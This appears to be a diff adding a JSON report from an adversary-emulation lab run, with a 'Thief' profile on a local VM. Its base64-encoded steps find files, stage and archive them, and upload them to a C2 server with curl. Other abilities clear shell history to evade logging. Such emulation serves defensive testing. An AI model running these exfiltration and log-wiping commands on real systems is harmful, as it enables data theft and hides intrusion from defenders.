@@ -1,0 +1,1168 @@
+{
+  "name": "THIEFNB (8/13/2022, 4:45:17 PM)",
+  "host_group": [
+    {
+      "sleep_min": 30,
+      "contact": "HTTP",
+      "deadman_enabled": true,
+      "created": "2022-08-11T15:01:46Z",
+      "watchdog": 0,
+      "pid": 80848,
+      "host_ip_addrs": [
+        "192.168.119.133"
+      ],
+      "server": "http://localhost:8888",
+      "executors": [
+        "proc",
+        "sh"
+      ],
+      "paw": "crqmfu",
+      "pending_contact": "HTTP",
+      "available_contacts": [
+        "HTTP"
+      ],
+      "proxy_receivers": {},
+      "platform": "linux",
+      "ppid": 4919,
+      "origin_link_id": "",
+      "display_name": "kusubyan-jarvis-vm$kusubyan",
+      "last_seen": "2022-08-13T21:16:03Z",
+      "location": "/home/kusubyan/dev/super_scary_local_sandcat",
+      "trusted": true,
+      "sleep_max": 60,
+      "group": "red",
+      "username": "kusubyan",
+      "links": [
+        {
+          "relationships": [],
+          "unique": "21878d82-7c5d-48bb-905c-2a6ec5d99721",
+          "id": "21878d82-7c5d-48bb-905c-2a6ec5d99721",
+          "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "deadman": false,
+          "jitter": 0,
+          "score": 0,
+          "pid": "80853",
+          "pin": 0,
+          "ability": {
+            "delete_payload": true,
+            "requirements": [],
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "repeatable": false,
+            "additional_info": {},
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "plugin": "stockpile",
+            "executors": [
+              {
+                "language": null,
+                "variations": [],
+                "additional_info": {},
+                "payloads": [],
+                "platform": "darwin",
+                "code": null,
+                "uploads": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "cleanup": [],
+                "timeout": 60,
+                "parsers": [],
+                "name": "sh",
+                "build_target": null
+              },
+              {
+                "language": null,
+                "variations": [],
+                "additional_info": {},
+                "payloads": [],
+                "platform": "linux",
+                "code": null,
+                "uploads": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "cleanup": [],
+                "timeout": 60,
+                "parsers": [],
+                "name": "sh",
+                "build_target": null
+              },
+              {
+                "language": null,
+                "variations": [],
+                "additional_info": {},
+                "payloads": [],
+                "platform": "windows",
+                "code": null,
+                "uploads": [],
+                "command": "Clear-History;Clear",
+                "cleanup": [],
+                "timeout": 60,
+                "parsers": [],
+                "name": "psh",
+                "build_target": null
+              }
+            ],
+            "technique_id": "T1070.003",
+            "access": {},
+            "singleton": false,
+            "privilege": "",
+            "tactic": "defense-evasion",
+            "buckets": [
+              "defense-evasion"
+            ],
+            "name": "Avoid logs",
+            "description": "Stop terminal from logging history"
+          },
+          "output": "False",
+          "status": 0,
+          "paw": "crqmfu",
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "executor": {
+            "language": null,
+            "variations": [],
+            "additional_info": {},
+            "payloads": [],
+            "platform": "linux",
+            "code": null,
+            "uploads": [],
+            "command": "> $HOME/.bash_history && unset HISTFILE",
+            "cleanup": [],
+            "timeout": 60,
+            "parsers": [],
+            "name": "sh",
+            "build_target": null
+          },
+          "decide": "2022-08-11T15:01:46Z",
+          "facts": [],
+          "host": "kusubyan-jarvis-vm",
+          "agent_reported_time": "2022-08-11T15:01:46Z",
+          "finish": "2022-08-11T15:01:46Z",
+          "cleanup": 0,
+          "used": [],
+          "collect": "2022-08-11T15:01:46Z"
+        },
+        {
+          "relationships": [],
+          "unique": "f3742e1b-993c-4a58-b260-e1a5b3640ed2",
+          "id": "f3742e1b-993c-4a58-b260-e1a5b3640ed2",
+          "command": "d2hvYW1p",
+          "deadman": false,
+          "jitter": 0,
+          "score": 0,
+          "pid": "80854",
+          "pin": 0,
+          "ability": {
+            "delete_payload": true,
+            "requirements": [],
+            "ability_id": "c0da588f-79f0-4263-8998-7496b1a40596",
+            "repeatable": false,
+            "additional_info": {},
+            "technique_name": "System Owner/User Discovery",
+            "plugin": "stockpile",
+            "executors": [
+              {
+                "language": null,
+                "variations": [],
+                "additional_info": {},
+                "payloads": [],
+                "platform": "darwin",
+                "code": null,
+                "uploads": [],
+                "command": "whoami",
+                "cleanup": [],
+                "timeout": 60,
+                "parsers": [
+                  {
+                    "parserconfigs": [
+                      {
+                        "target": "",
+                        "source": "host.user.name",
+                        "edge": "",
+                        "custom_parser_vals": {}
+                      },
+                      {
+                        "target": "",
+                        "source": "domain.user.name",
+                        "edge": "",
+                        "custom_parser_vals": {}
+                      }
+                    ],
+                    "module": "plugins.stockpile.app.parsers.basic"
+                  }
+                ],
+                "name": "sh",
+                "build_target": null
+              },
+              {
+                "language": null,
+                "variations": [],
+                "additional_info": {},
+                "payloads": [],
+                "platform": "linux",
+                "code": null,
+                "uploads": [],
+                "command": "whoami",
+                "cleanup": [],
+                "timeout": 60,
+                "parsers": [
+                  {
+                    "parserconfigs": [
+                      {
+                        "target": "",
+                        "source": "host.user.name",
+                        "edge": "",
+                        "custom_parser_vals": {}
+                      },
+                      {
+                        "target": "",
+                        "source": "domain.user.name",
+                        "edge": "",
+                        "custom_parser_vals": {}
+                      }
+                    ],
+                    "module": "plugins.stockpile.app.parsers.basic"
+                  }
+                ],
+                "name": "sh",
+                "build_target": null
+              },
+              {
+                "language": null,
+                "variations": [],
+                "additional_info": {},
+                "payloads": [],
+                "platform": "windows",
+                "code": null,
+                "uploads": [],
+                "command": "$env:username",
+                "cleanup": [],
+                "timeout": 60,
+                "parsers": [
+                  {
+                    "parserconfigs": [
+                      {
+                        "target": "",
+                        "source": "host.user.name",
+                        "edge": "",
+                        "custom_parser_vals": {}
+                      },
+                      {
+                        "target": "",
+                        "source": "domain.user.name",
+                        "edge": "",
+                        "custom_parser_vals": {}
+                      }
+                    ],
+                    "module": "plugins.stockpile.app.parsers.basic"
+                  }
+                ],
+                "name": "psh",
+                "build_target": null
+              },
+              {
+                "language": null,
+                "variations": [],
+                "additional_info": {},
+                "payloads": [],
+                "platform": "windows",
+                "code": null,
+                "uploads": [],
+                "command": "echo %username%",
+                "cleanup": [],
+                "timeout": 60,
+                "parsers": [
+                  {
+                    "parserconfigs": [
+                      {
+                        "target": "",
+                        "source": "host.user.name",
+                        "edge": "",
+                        "custom_parser_vals": {}
+                      },
+                      {
+                        "target": "",
+                        "source": "domain.user.name",
+                        "edge": "",
+                        "custom_parser_vals": {}
+                      }
+                    ],
+                    "module": "plugins.stockpile.app.parsers.basic"
+                  }
+                ],
+                "name": "cmd",
+                "build_target": null
+              }
+            ],
+            "technique_id": "T1033",
+            "access": {},
+            "singleton": false,
+            "privilege": "",
+            "tactic": "discovery",
+            "buckets": [
+              "discovery"
+            ],
+            "name": "Identify active user",
+            "description": "Find user running agent"
+          },
+          "output": "True",
+          "status": 0,
+          "paw": "crqmfu",
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "executor": {
+            "language": null,
+            "variations": [],
+            "additional_info": {},
+            "payloads": [],
+            "platform": "linux",
+            "code": null,
+            "uploads": [],
+            "command": "whoami",
+            "cleanup": [],
+            "timeout": 60,
+            "parsers": [
+              {
+                "parserconfigs": [
+                  {
+                    "target": "",
+                    "source": "host.user.name",
+                    "edge": "",
+                    "custom_parser_vals": {}
+                  },
+                  {
+                    "target": "",
+                    "source": "domain.user.name",
+                    "edge": "",
+                    "custom_parser_vals": {}
+                  }
+                ],
+                "module": "plugins.stockpile.app.parsers.basic"
+              }
+            ],
+            "name": "sh",
+            "build_target": null
+          },
+          "decide": "2022-08-11T15:01:46Z",
+          "facts": [
+            {
+              "links": [
+                "f3742e1b-993c-4a58-b260-e1a5b3640ed2"
+              ],
+              "trait": "host.user.name",
+              "relationships": [
+                "host.user.name(kusubyan)"
+              ],
+              "unique": "host.user.namekusubyan",
+              "limit_count": -1,
+              "technique_id": "T1033",
+              "source": "f3742e1b-993c-4a58-b260-e1a5b3640ed2",
+              "collected_by": [
+                "crqmfu"
+              ],
+              "origin_type": "LEARNED",
+              "value": "kusubyan",
+              "created": "2022-08-11T15:01:47Z",
+              "score": 1,
+              "name": "host.user.name"
+            },
+            {
+              "links": [
+                "f3742e1b-993c-4a58-b260-e1a5b3640ed2"
+              ],
+              "trait": "domain.user.name",
+              "relationships": [
+                "domain.user.name(kusubyan)"
+              ],
+              "unique": "domain.user.namekusubyan",
+              "limit_count": -1,
+              "technique_id": "T1033",
+              "source": "f3742e1b-993c-4a58-b260-e1a5b3640ed2",
+              "collected_by": [
+                "crqmfu"
+              ],
+              "origin_type": "LEARNED",
+              "value": "kusubyan",
+              "created": "2022-08-11T15:01:47Z",
+              "score": 1,
+              "name": "domain.user.name"
+            }
+          ],
+          "host": "kusubyan-jarvis-vm",
+          "agent_reported_time": "2022-08-11T15:01:46Z",
+          "finish": "2022-08-11T15:01:47Z",
+          "cleanup": 0,
+          "used": [],
+          "collect": "2022-08-11T15:01:46Z"
+        }
+      ],
+      "host": "kusubyan-jarvis-vm",
+      "architecture": "amd64",
+      "upstream_dest": "http://localhost:8888",
+      "proxy_chain": [],
+      "exe_name": "super_scary_local_sandcat",
+      "privilege": "User"
+    }
+  ],
+  "start": "2022-08-13T20:45:17Z",
+  "steps": {
+    "crqmfu": {
+      "steps": [
+        {
+          "link_id": "9bf08c5d-1f7b-464a-bd0e-67c9e9da4fb0",
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "command": "ZmluZCAvIC1uYW1lICcqLnltbCcgLXR5cGUgZiAtbm90IC1wYXRoICcqL1wuKicgLXNpemUgLTUwMGsgMj4vZGV2L251bGwgfCBoZWFkIC01",
+          "delegated": "2022-08-13T20:45:18Z",
+          "run": "2022-08-13T20:45:34Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 107938,
+          "description": "Locate files deemed sensitive",
+          "name": "Find files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data from Local System",
+            "technique_id": "T1005"
+          },
+          "agent_reported_time": "2022-08-13T20:45:33Z"
+        },
+        {
+          "link_id": "a238a082-063e-4f5a-a054-03e8276ae322",
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "command": "ZmluZCAvIC1uYW1lICcqLnBuZycgLXR5cGUgZiAtbm90IC1wYXRoICcqL1wuKicgLXNpemUgLTUwMGsgMj4vZGV2L251bGwgfCBoZWFkIC01",
+          "delegated": "2022-08-13T20:45:38Z",
+          "run": "2022-08-13T20:46:07Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 107957,
+          "description": "Locate files deemed sensitive",
+          "name": "Find files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data from Local System",
+            "technique_id": "T1005"
+          },
+          "agent_reported_time": "2022-08-13T20:46:05Z"
+        },
+        {
+          "link_id": "46001561-9898-40a5-b95f-690566fade0c",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "command": "bWtkaXIgLXAgc3RhZ2VkICYmIGVjaG8gJFBXRC9zdGFnZWQ=",
+          "delegated": "2022-08-13T20:46:08Z",
+          "run": "2022-08-13T20:46:41Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 107967,
+          "description": "create a directory for exfil staging",
+          "name": "Create staging directory",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "agent_reported_time": "2022-08-13T20:46:41Z"
+        },
+        {
+          "link_id": "37e626cd-51af-4f16-ac2f-77eff19d639e",
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "command": "Y3AgIi9ob21lL2t1c3VieWFuL2Rldi9jYWxkZXJhL2RhdGEvc291cmNlcy81YTg2MTJmNi0xZWM5LTRhMGEtYWMxNC1hYTZkNjVkMTM5MjEueW1sIiAvaG9tZS9rdXN1Ynlhbi9kZXYvc3RhZ2Vk",
+          "delegated": "2022-08-13T20:46:43Z",
+          "run": "2022-08-13T20:47:29Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 107991,
+          "description": "copy files to staging directory",
+          "name": "Stage sensitive files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "agent_reported_time": "2022-08-13T20:47:29Z"
+        },
+        {
+          "link_id": "a6957d8f-47bf-4d5d-aedf-238aa3c850d0",
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "command": "Y3AgIi9ob21lL2t1c3VieWFuL2Rldi9jYWxkZXJhL2RhdGEvc291cmNlcy9kODJmZTBkNS05OGMwLTQ2NzQtOGUzZi05M2NmMGQwY2RhYWUueW1sIiAvaG9tZS9rdXN1Ynlhbi9kZXYvc3RhZ2Vk",
+          "delegated": "2022-08-13T20:47:33Z",
+          "run": "2022-08-13T20:48:11Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 108102,
+          "description": "copy files to staging directory",
+          "name": "Stage sensitive files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "agent_reported_time": "2022-08-13T20:48:11Z"
+        },
+        {
+          "link_id": "141ad7eb-1953-4fdf-abfc-f13b8468ce64",
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "command": "Y3AgIi9ob21lL2t1c3VieWFuL2Rldi9jYWxkZXJhL2RhdGEvc291cmNlcy8xMmFiNzJlYi00ZjgxLTRlZjUtOTIwOC01YjY3NGJhYjk1M2MueW1sIiAvaG9tZS9rdXN1Ynlhbi9kZXYvc3RhZ2Vk",
+          "delegated": "2022-08-13T20:48:13Z",
+          "run": "2022-08-13T20:48:58Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 109110,
+          "description": "copy files to staging directory",
+          "name": "Stage sensitive files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "agent_reported_time": "2022-08-13T20:48:58Z"
+        },
+        {
+          "link_id": "9a23937f-72f1-40a3-b8b0-8c0e7fe4c239",
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "command": "ZmluZCAvIC1uYW1lICcqLndhdicgLXR5cGUgZiAtbm90IC1wYXRoICcqL1wuKicgLXNpemUgLTUwMGsgMj4vZGV2L251bGwgfCBoZWFkIC01",
+          "delegated": "2022-08-13T20:48:58Z",
+          "run": "2022-08-13T20:50:02Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 109131,
+          "description": "Locate files deemed sensitive",
+          "name": "Find files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data from Local System",
+            "technique_id": "T1005"
+          },
+          "agent_reported_time": "2022-08-13T20:49:34Z"
+        },
+        {
+          "link_id": "c6c89f55-5f00-46c2-89ca-4f9c48f4334f",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "command": "dGFyIC1QIC16Y2YgL2hvbWUva3VzdWJ5YW4vZGV2L3N0YWdlZC50YXIuZ3ogL2hvbWUva3VzdWJ5YW4vZGV2L3N0YWdlZCAmJiBlY2hvIC9ob21lL2t1c3VieWFuL2Rldi9zdGFnZWQudGFyLmd6",
+          "delegated": "2022-08-13T20:50:03Z",
+          "run": "2022-08-13T20:50:19Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 109141,
+          "description": "Compress a directory on the file system",
+          "name": "Compress staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Archive Collected Data: Archive via Utility",
+            "technique_id": "T1560.001"
+          },
+          "agent_reported_time": "2022-08-13T20:50:19Z"
+        },
+        {
+          "link_id": "8a614a20-29d7-48da-b410-3ee9ec282801",
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "command": "Y3VybCAtRiAiZGF0YT1AL2hvbWUva3VzdWJ5YW4vZGV2L3N0YWdlZC50YXIuZ3oiIC0taGVhZGVyICJYLVJlcXVlc3QtSUQ6IGBob3N0bmFtZWAtY3JxbWZ1IiBodHRwOi8vbG9jYWxob3N0Ojg4ODgvZmlsZS91cGxvYWQ=",
+          "delegated": "2022-08-13T20:50:23Z",
+          "run": "2022-08-13T20:50:58Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 109196,
+          "description": "Exfil the staged directory",
+          "name": "Exfil staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Exfiltration Over C2 Channel",
+            "technique_id": "T1041"
+          },
+          "agent_reported_time": "2022-08-13T20:50:58Z"
+        },
+        {
+          "link_id": "75d99ad2-8f8f-4237-92cb-d6db6b6aded9",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "command": "cm0gL2hvbWUva3VzdWJ5YW4vZGV2L3N0YWdlZC50YXIuZ3o=",
+          "delegated": "2022-08-13T20:51:38Z",
+          "run": "2022-08-13T20:51:52Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 109232,
+          "description": "Compress a directory on the file system",
+          "name": "Compress staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Archive Collected Data: Archive via Utility",
+            "technique_id": "T1560.001"
+          },
+          "agent_reported_time": "2022-08-13T20:51:52Z"
+        },
+        {
+          "link_id": "21d27fae-4590-4100-8943-7b08a7056252",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "command": "cm0gLXJmIHN0YWdlZA==",
+          "delegated": "2022-08-13T20:51:38Z",
+          "run": "2022-08-13T20:51:54Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 109234,
+          "description": "create a directory for exfil staging",
+          "name": "Create staging directory",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "agent_reported_time": "2022-08-13T20:51:54Z"
+        }
+      ]
+    }
+  },
+  "finish": "2022-08-13T20:51:56Z",
+  "planner": "naive bayes",
+  "adversary": {
+    "has_repeatable_abilities": false,
+    "plugin": "stockpile",
+    "tags": [],
+    "adversary_id": "1a98b8e6-18ce-4617-8cc5-e65a1a9d490e",
+    "atomic_ordering": [
+      "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "4e97e699-93d7-4040-b5a3-2e906a58199e",
+      "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+      "ea713bc4-63f0-491c-9a6f-0b01d560b87e"
+    ],
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "name": "Thief",
+    "description": "An adversary to steal sensitive files"
+  },
+  "jitter": "0/2",
+  "objectives": {
+    "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "name": "default",
+    "goals": [
+      {
+        "value": "complete",
+        "achieved": false,
+        "operator": "==",
+        "target": "exhaustion",
+        "count": 1048576
+      }
+    ],
+    "percentage": 0,
+    "description": "This is a default objective that runs forever."
+  },
+  "facts": [
+    {
+      "links": [
+        "6c0e55cd-3f04-4fe6-9430-e5c646bb363c",
+        "6a6c53ee-db05-455f-99b7-0699e68e82b1",
+        "922c2867-01fd-406b-b7ff-6003c118c1a7",
+        "ca7e2f61-0c70-4f51-9569-8a7d8dc33e6c",
+        "a968f50e-81ec-4775-8438-11497367f0ed",
+        "c678f529-d175-4049-adb6-0c039e963a2d",
+        "436bc1fa-ab50-47ff-848e-eb84c08b2cf9",
+        "5e23a2a5-d9b8-4a46-b262-70191bde7e69",
+        "5a97fc24-6cd9-4149-add0-551d9ef5b0ed",
+        "060fec33-36f1-45db-8ea5-091bcdc40ea1",
+        "7446aa51-1141-4795-acec-2d79d3c109a1",
+        "9a23937f-72f1-40a3-b8b0-8c0e7fe4c239"
+      ],
+      "trait": "file.sensitive.extension",
+      "relationships": [
+        "host.file.path(/usr/share/sounds/sound-icons/cembalo-10.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/usr/share/sounds/sound-icons/cembalo-12.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/usr/share/sounds/sound-icons/gummy-cat-2.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/usr/share/sounds/sound-icons/glass-water-1.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/usr/share/sounds/sound-icons/trumpet-1.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/home/kusubyan/dev/staged/cembalo-10.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/home/kusubyan/dev/staged/cembalo-12.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/home/kusubyan/dev/staged/gummy-cat-2.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "unique": "file.sensitive.extensionwav",
+      "limit_count": -1,
+      "technique_id": "",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "collected_by": [],
+      "origin_type": "SEEDED",
+      "value": "wav",
+      "created": "2022-08-04T19:24:56Z",
+      "score": 61,
+      "name": "file.sensitive.extension"
+    },
+    {
+      "links": [
+        "44056741-2d7d-44b5-bd8c-1a9ef72d9801",
+        "0cc1cdaf-d122-4f5d-8429-77c6137cda21",
+        "9ce73566-1e4c-4763-80a0-de1e260f9f48",
+        "533587f8-1f26-42ac-bb68-2d8ef833d680",
+        "9fd5e9f9-a15b-47e5-8736-e7d25dbe7bfa",
+        "1ffaf017-719b-4892-b7d2-5f80141eecd2",
+        "d4033dae-f33f-42f6-98d8-9e71d90c6971",
+        "1d251cb1-0b2e-4357-bbf5-75f53596e16f",
+        "6d125d72-14e7-46c6-ac37-7b2f1ce3af6b",
+        "34f7d873-6246-4814-b434-64cab4c5be0b",
+        "6dae5466-1d93-47e0-b747-916e35044ac6",
+        "c4c1dbdf-bb70-4b4c-a195-a26b3474c540",
+        "5da4de4a-a322-430b-84ed-ad316dc0337e",
+        "f98dcf52-88f3-44b3-a927-3f015f080187",
+        "78033a33-24c2-4f95-a45d-0bb9d9b7626b",
+        "5fa81fca-3ce5-4782-9eb3-dab2d3f55cf4",
+        "f8f815b8-05d2-45e9-bce7-127e90786189",
+        "ec4af9ed-7be1-431d-a2fd-2e60b5c4b159",
+        "9bf08c5d-1f7b-464a-bd0e-67c9e9da4fb0"
+      ],
+      "trait": "file.sensitive.extension",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/docker-compose.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/gameboard/data/abilities/verification/4a9b51ba-1a0d-4128-a040-5535fd147dc3.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/gameboard/data/abilities/verification/0df4d46e-e202-4b29-9a19-c2540982002d.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/gameboard/data/adversaries/7d1794bb-d7ce-4fe8-bae0-6959fa0a0a48.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/gameboard/conf/gameboard.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/6eeab540-fb0a-40be-a36a-03bd9734cb38.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/9f1cd219-1d60-421d-a6ba-c1acdf8ac0ce.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/37ef0c68-f47f-4a61-b96b-4662eccf1e22.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/b034ab07-7058-4240-b9b7-9e5a1999eba4.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/e31aef65-12b7-4507-926f-4d5305eb7276.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/staged/37ef0c68-f47f-4a61-b96b-4662eccf1e22.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/staged/6eeab540-fb0a-40be-a36a-03bd9734cb38.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/staged/b034ab07-7058-4240-b9b7-9e5a1999eba4.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/36eb1972-28f4-403c-8178-5c740ef83af9.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/cdf61658-0d3f-4ffd-92a4-51f3932d5d19.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/56452120-c090-4728-a498-a07a8ec85df3.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/5a8612f6-1ec9-4a0a-ac14-aa6d65d13921.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/d82fe0d5-98c0-4674-8e3f-93cf0d0cdaae.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/8e52d40e-50a8-4c3c-b7b8-8eb9bc9a96e6.yml) : has_extension : file.sensitive.extension(yml)",
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/12ab72eb-4f81-4ef5-9208-5b674bab953c.yml) : has_extension : file.sensitive.extension(yml)"
+      ],
+      "unique": "file.sensitive.extensionyml",
+      "limit_count": -1,
+      "technique_id": "",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "collected_by": [],
+      "origin_type": "SEEDED",
+      "value": "yml",
+      "created": "2022-08-04T19:24:56Z",
+      "score": 96,
+      "name": "file.sensitive.extension"
+    },
+    {
+      "links": [
+        "e849975d-5d28-4712-aaa7-a92792019e41",
+        "026c9601-85dc-48cf-8abf-2b40a66f695d",
+        "f2f90b4a-d882-4db2-9169-8c0d1a8140aa",
+        "f14e00bc-f156-4a64-a08b-82426f0065e8",
+        "f24e0b6f-da39-4392-b987-77378d536eb4",
+        "be5f78fb-a660-4714-8d65-058491d36c2a",
+        "f741690e-04f5-4084-b325-bb8346a48fb4",
+        "9e2c5f2e-9b7b-4020-a610-5ee5aa83db93",
+        "bc4f4549-f0bb-473e-b0e0-07948e5e3efc",
+        "37077d82-1d77-42e0-af58-253f23741ba6",
+        "4bcecb91-db71-49b8-9f37-41f5f22adfc7",
+        "ffee06fe-e032-493f-af2e-60542f072c58",
+        "60621bc6-9ab1-4851-b204-2fab1e13cf4b",
+        "06466cb0-e95c-4517-88aa-af15eb49a038",
+        "f796c7f1-2e31-4945-ab73-d368fd7ea464",
+        "7ef5a6ac-248c-4fbd-960a-fe8534e1af5c",
+        "a238a082-063e-4f5a-a054-03e8276ae322"
+      ],
+      "trait": "file.sensitive.extension",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/fact_relationships.png) : has_extension : file.sensitive.extension(png)",
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/debrief_attack_path.png) : has_extension : file.sensitive.extension(png)",
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/img/privileged_persistence_state_machine.png) : has_extension : file.sensitive.extension(png)",
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/_build/html/_static/plus.png) : has_extension : file.sensitive.extension(png)",
+        "host.file.path(/home/kusubyan/dev/caldera/plugins/fieldmanual/sphinx-docs/_build/html/_static/file.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "unique": "file.sensitive.extensionpng",
+      "limit_count": -1,
+      "technique_id": "",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "collected_by": [],
+      "origin_type": "SEEDED",
+      "value": "png",
+      "created": "2022-08-04T19:24:56Z",
+      "score": 86,
+      "name": "file.sensitive.extension"
+    },
+    {
+      "links": [],
+      "trait": "server.malicious.url",
+      "relationships": [],
+      "unique": "server.malicious.urlkeyloggedsite.com",
+      "limit_count": -1,
+      "technique_id": "",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "collected_by": [],
+      "origin_type": "SEEDED",
+      "value": "keyloggedsite.com",
+      "created": "2022-08-04T19:24:56Z",
+      "score": 1,
+      "name": "server.malicious.url"
+    },
+    {
+      "links": [
+        "9bf08c5d-1f7b-464a-bd0e-67c9e9da4fb0"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
+        "host.file.path(/home/kusubyan/dev/caldera/data/sources/5a8612f6-1ec9-4a0a-ac14-aa6d65d13921.yml) : has_extension : file.sensitive.extension(yml)"
+      ],
+      "unique": "host.file.path/home/kusubyan/dev/caldera/data/sources/5a8612f6-1ec9-4a0a-ac14-aa6d65d13921.yml",
+      "limit_count": -1,
+      "technique_id": "T1005",
+      "source": "156865ee-3db3-4b1a-be57-1236f67b6a82",
+      "collected_by": [
+        "crqmfu"
+      ],
+      "origin_type": "LEARNED",
+      "value": "/home/kusubyan/dev/caldera/data/sources/5a8612f6-1ec9-4a0a-ac14-aa6d65d13921.yml",
+      "created": "2022-08-13T20:45:34Z",
+      "score": 1,
+      "name": "host.file.path"
+    },
+    {
+      "links": [
+        "9bf08c5d-1f7b-464a-bd0e-67c9e9da4fb0"
+      ],
+      "trait": "host.file.path",
+      "relationships": [
